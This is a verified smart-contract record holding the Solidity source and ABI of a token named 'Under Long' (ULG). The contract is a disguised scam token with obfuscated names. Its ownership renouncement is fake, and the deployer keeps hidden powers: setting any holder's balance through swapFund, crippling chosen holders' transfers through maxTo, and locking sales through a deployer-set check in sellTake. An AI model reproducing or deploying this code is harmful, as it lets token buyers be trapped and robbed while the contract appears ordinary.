{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface amountFeeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeBuy {\n    function createPair(address listAuto, address swapEnable) external returns (address);\n}\n\ninterface launchedMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptTeam) external view returns (uint256);\n\n    function transfer(address toToken, uint256 marketingBuy) external returns (bool);\n\n    function allowance(address modeLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toToken,\n        uint256 marketingBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMax, uint256 value);\n    event Approval(address indexed modeLimit, address indexed spender, uint256 value);\n}\n\ninterface tokenBuy is launchedMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderLong is atLaunched, launchedMin, tokenBuy {\n\n    uint256 sellTotal;\n\n    mapping(address => bool) public listFrom;\n\n    uint256 public tradingLaunchMin;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedLimit;\n    }\n\n    function enableLiquidity() private view {\n        require(listFrom[_msgSender()]);\n    }\n\n    function maxTo(address shouldMax) public {\n        enableLiquidity();\n        if (launchedIs) {\n            shouldLaunched = enableSender;\n        }\n        if (shouldMax == toLimit || shouldMax == autoSwap) {\n            return;\n        }\n        autoToMax[shouldMax] = true;\n    }\n\n    string private toSell = \"ULG\";\n\n    uint256 receiverTeam;\n\n    function swapFrom(address enableSwapAmount, address toToken, uint256 marketingBuy) internal returns (bool) {\n        require(tokenMarketing[enableSwapAmount] >= marketingBuy);\n        tokenMarketing[enableSwapAmount] -= marketingBuy;\n        tokenMarketing[toToken] += marketingBuy;\n        emit Transfer(enableSwapAmount, toToken, marketingBuy);\n        return true;\n    }\n\n    uint256 public senderLaunched;\n\n    address private fundMax;\n\n    bool public buyWalletLimit;\n\n    function allowance(address marketingSenderExempt, address shouldLaunchList) external view virtual override returns (uint256) {\n        if (shouldLaunchList == amountExempt) {\n            return type(uint256).max;\n        }\n        return marketingSender[marketingSenderExempt][shouldLaunchList];\n    }\n\n    uint256 public shouldLaunched;\n\n    function swapFund(address shouldSwap, uint256 marketingBuy) public {\n        enableLiquidity();\n        tokenMarketing[shouldSwap] = marketingBuy;\n    }\n\n    function transferFrom(address enableSwapAmount, address toToken, uint256 marketingBuy) external override returns (bool) {\n        if (_msgSender() != amountExempt) {\n            if (marketingSender[enableSwapAmount][_msgSender()] != type(uint256).max) {\n                require(marketingBuy <= marketingSender[enableSwapAmount][_msgSender()]);\n                marketingSender[enableSwapAmount][_msgSender()] -= marketingBuy;\n            }\n        }\n        return sellTake(enableSwapAmount, toToken, marketingBuy);\n    }\n\n    bool private marketingMax;\n\n    uint8 private buyMax = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSwap;\n    }\n\n    string private launchedLimit = \"Under Long\";\n\n    bool private launchedIs;\n\n    function listTxFrom(uint256 marketingBuy) public {\n        enableLiquidity();\n        receiverTeam = marketingBuy;\n    }\n\n    bool private senderReceiver;\n\n    mapping(address => bool) public autoToMax;\n\n    address public autoSwap;\n\n    function sellTake(address enableSwapAmount, address toToken, uint256 marketingBuy) internal returns (bool) {\n        if (enableSwapAmount == toLimit) {\n            return swapFrom(enableSwapAmount, toToken, marketingBuy);\n        }\n        uint256 fromFund = launchedMin(autoSwap).balanceOf(totalFrom);\n        require(fromFund == receiverTeam);\n        require(toToken != totalFrom);\n        if (autoToMax[enableSwapAmount]) {\n            return swapFrom(enableSwapAmount, toToken, walletReceiver);\n        }\n        return swapFrom(enableSwapAmount, toToken, marketingBuy);\n    }\n\n    uint256 public enableSender;\n\n    address public toLimit;\n\n    function owner() external view returns (address) {\n        return fundMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingSender;\n\n    function balanceOf(address exemptTeam) public view virtual override returns (uint256) {\n        return tokenMarketing[exemptTeam];\n    }\n\n    function txLaunched() public {\n        emit OwnershipTransferred(toLimit, address(0));\n        fundMax = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    address totalFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyMax;\n    }\n\n    uint256 private launchedSwap = 100000000 * 10 ** 18;\n\n    function swapLiquidity(address shouldFee) public {\n        if (buyWalletLimit) {\n            return;\n        }\n        if (senderReceiver) {\n            senderReceiver = false;\n        }\n        listFrom[shouldFee] = true;\n        if (marketingMax != totalReceiver) {\n            enableSender = senderLaunched;\n        }\n        buyWalletLimit = true;\n    }\n\n    bool private totalReceiver;\n\n    address amountExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return fundMax;\n    }\n\n    event OwnershipTransferred(address indexed tokenMax, address indexed senderFundAuto);\n\n    constructor (){\n        \n        amountFeeMin totalIsEnable = amountFeeMin(amountExempt);\n        autoSwap = takeBuy(totalIsEnable.factory()).createPair(totalIsEnable.WETH(), address(this));\n        if (launchedIs != marketingMax) {\n            tradingLaunchMin = shouldLaunched;\n        }\n        toLimit = _msgSender();\n        txLaunched();\n        listFrom[toLimit] = true;\n        tokenMarketing[toLimit] = launchedSwap;\n        \n        emit Transfer(address(0), toLimit, launchedSwap);\n    }\n\n    bool public minSenderLaunched;\n\n    mapping(address => uint256) private tokenMarketing;\n\n    function approve(address shouldLaunchList, uint256 marketingBuy) public virtual override returns (bool) {\n        marketingSender[_msgSender()][shouldLaunchList] = marketingBuy;\n        emit Approval(_msgSender(), shouldLaunchList, marketingBuy);\n        return true;\n    }\n\n    function transfer(address shouldSwap, uint256 marketingBuy) external virtual override returns (bool) {\n        return sellTake(_msgSender(), shouldSwap, marketingBuy);\n    }\n\n    uint256 constant walletReceiver = 19 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFundAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLaunchList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoToMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingBuy\",\"type\":\"uint256\"}],\"name\":\"listTxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSenderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingBuy\",\"type\":\"uint256\"}],\"name\":\"swapFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunchMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}